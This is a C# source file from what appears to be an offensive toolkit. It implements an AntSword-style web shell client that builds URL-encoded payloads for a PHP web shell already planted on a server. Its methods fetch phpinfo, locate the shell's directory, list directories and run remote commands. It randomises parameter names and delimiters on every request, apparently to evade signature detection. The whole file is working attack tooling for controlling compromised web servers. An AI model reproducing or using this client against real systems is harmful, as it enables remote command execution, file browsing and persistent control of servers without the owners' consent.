using C2.Core;
using C2.Utils;

namespace C2.Business.CastleBravo.WebShellTool
{
    class AntSwordClient : CommonClient
    {


        public AntSwordClient(string password, string clientSetting)
            :base(password, clientSetting)
        {
            this.prefix = password + "=";
            ShellSplitS = RandomShellSplit();
            ShellSplitE = RandomShellSplit();
        }

        private string RandomSPL()
        {
            int lenL = RandomUtil.RandomInt(7, 13);
            int lenR = (int)(lenL / 2);
            lenL -= lenR;

            return RandomUtil.RandomHexString(lenL, 0) + "\".\"" + RandomUtil.RandomHexString(lenR, 0);
        }

        private string RandomShellSplit()
        {
            int len = RandomUtil.RandomInt(6, 12);
            return RandomUtil.RandomHexString(len, 0);
        }

        private string RandomSPR()
        {
            return RandomSPL(); 
        }
        
        private string RandomValueAB()
        {
            return RandomUtil.RandomString(2, 1); 
        }

        private string RandomTmDir()
        {
            return RandomUtil.RandomHexString(9, 0, "."); 
        }

        private string RandomParamK()
        {
            return RandomUtil.RandomString(14, 0);
        }

        private void SessionReset()
        {
            this.clientSetting.SPL    = RandomSPL();
            this.clientSetting.SPR    = RandomSPR();
            this.clientSetting.CODE   = RandomTmDir();      // 借用字段存一下, 不想建新变量,
            this.clientSetting.PARAM1 = RandomValueAB();    // 以下同上
            this.clientSetting.PARAM2 = RandomValueAB();      
            this.clientSetting.PARAM3 = RandomValueAB();

            this.clientSetting.ACTION = RandomParamK();
            this.clientSetting.PHP_MAKE = RandomParamK();
            this.clientSetting.PHP_BASE64 = RandomParamK(); // 以下同上
        }

        public override string PHPInfo()
        {
            // 1 根据payload模板生成各种随机参数
            // 2 将随机参数赋值到session中供解析rsp时使用
            // 3 构造payload
            // 4 发包
            // 5 解析返回包
            // 6 清空本次session参数,因为antsword每次报文参数都不一样
            SessionReset();
            string phpinfo = clientSetting.PHP_INFO
                                          .Replace("@SPL", clientSetting.SPL)
                                          .Replace("@SPR", clientSetting.SPR)
                                          .Replace("@TMDIR", clientSetting.CODE);

            string payload = this.prefix + ST.UrlEncode(phpinfo);

            sb.AppendLine("phpinfo:")
              .AppendLine(payload)
              .AppendLine(string.Format("攻击段:{0}", phpinfo))
              .AppendLine("随机参数 SPL:" + clientSetting.SPL)
              .AppendLine("随机参数 SPR:" + clientSetting.SPR)
              .AppendLine("随机参数 TMDIR:" + clientSetting.CODE);

            clientSetting.SPL = clientSetting.SPL.Replace("\".\"", "");
            clientSetting.SPR = clientSetting.SPR.Replace("\".\"", "");

            return payload;
        }

        public override string PHPIndex()
        {
            SessionReset();
            string phpindex = clientSetting.PHP_INDEX
                                           .Replace("@SPL", clientSetting.SPL)
                                           .Replace("@SPR", clientSetting.SPR)
                                           .Replace("@TMDIR", clientSetting.CODE);

            string payload = this.prefix + ST.UrlEncode(phpindex);

            sb.AppendLine("定位D洞所在目录:")
              .AppendLine(payload)
              .AppendLine(string.Format("攻击段:{0}", phpindex))
              .AppendLine("随机参数 SPL:" + clientSetting.SPL)
              .AppendLine("随机参数 SPR:" + clientSetting.SPR)
              .AppendLine("随机参数 TMDIR:" + clientSetting.CODE);
            
            clientSetting.SPL = clientSetting.SPL.Replace("\".\"", "");
            clientSetting.SPR = clientSetting.SPR.Replace("\".\"", "");

            return payload;
        }

        public override string PHPReadDict(string dict)
        {
            SessionReset();
            string param1k = clientSetting.ACTION;
            string param1v = clientSetting.PARAM1 + ST.EncodeBase64(dict);

            string param1  = string.Format("{0}={1}&", param1k, param1v);
            string readdict = clientSetting.PHP_READDICT
                                           .Replace("@SPL", clientSetting.SPL)
                                           .Replace("@SPR", clientSetting.SPR)
                                           .Replace("@TMDIR", clientSetting.CODE)
                                           .Replace("@PARAM1K", clientSetting.ACTION)
                                           .Replace("@NEWLINE", "\n");  // 特殊处理

            string payload = string.Format("{0}{1}{2}", param1, this.prefix, ST.UrlEncode(readdict));

            sb.AppendLine("遍历目录:")
              .AppendLine(payload)
              .AppendLine(string.Format("攻击段:{0}", readdict))
              .AppendLine("随机参数 SPL:" + clientSetting.SPL)
              .AppendLine("随机参数 SPR:" + clientSetting.SPR)
              .AppendLine("随机参数 TMDIR:" + clientSetting.CODE)
              .AppendLine("随机参数 PARAM1 Key:" + param1k)
              .AppendLine("随机参数 PARAM1 AB:" + clientSetting.ACTION)
              .AppendLine("查询路径:" + dict);

            clientSetting.SPL = clientSetting.SPL.Replace("\".\"", "");
            clientSetting.SPR = clientSetting.SPR.Replace("\".\"", "");

            return payload;
        }

        public override string PHPShell(string shellEnv, string command)
        {  // 有 SPL SPR TMDIR, P1.Key, P2.Key, P3.Key, P1.ValueAB, P2.ValueAB, P3.ValueAB
           // 9个随机变量
            SessionReset();
            string param1k = clientSetting.ACTION;
            string param2k = clientSetting.PHP_MAKE;
            string param3k = clientSetting.PHP_BASE64;

            

            string param1v = RandomUtil.RandomHexString(2, 0);
            string param2v = RandomUtil.RandomHexString(2, 0) + ST.EncodeBase64(ST.SuperDecodeBase64(command));
            string param3v = RandomUtil.RandomHexString(2, 0) + ST.EncodeBase64(shellEnv);

            string shell = clientSetting.PHP_SHELL.Replace("@SPL", clientSetting.SPL)
                                                  .Replace("@SPR", clientSetting.SPR)
                                                  .Replace("@PARAM1K", param1k)
                                                  .Replace("@PARAM2K", param2k)
                                                  .Replace("@PARAM3K", param3k)
                                                  .Replace("@TMDIR", clientSetting.CODE);

            string payload = param1k + "=" + param1v + "&" +
                             param2k + "=" + param2v + "&" +
                             param3k + "=" + param3v + "&" +
                             this.prefix + ST.UrlEncode(shell);

            sb.AppendLine("Remote Command:")
              .AppendLine(payload)
              .AppendLine(string.Format("攻击段:{0}", shell))
              .AppendLine("随机参数 SPL:" + clientSetting.SPL)
              .AppendLine("随机参数 SPR:" + clientSetting.SPR)
              .AppendLine("随机参数 TMDIR:" + clientSetting.CODE)
              .AppendLine("随机参数 PARAM1 Key:" + param1k)
              .AppendLine("随机参数 PARAM2 Key:" + param2k)
              .AppendLine("随机参数 PARAM3 Key:" + param3k)
              .AppendLine("随机参数 PARAM1 value:" + param1v)
              .AppendLine("随机参数 PARAM2 value:" + param2v)
              .AppendLine("随机参数 PARAM3 value:" + param3v)
              .AppendLine("命令:" + command);

            clientSetting.SPL = clientSetting.SPL.Replace("\".\"", "");
            clientSetting.SPR = clientSetting.SPR.Replace("\".\"", "");
            return payload;
        }


    }
}
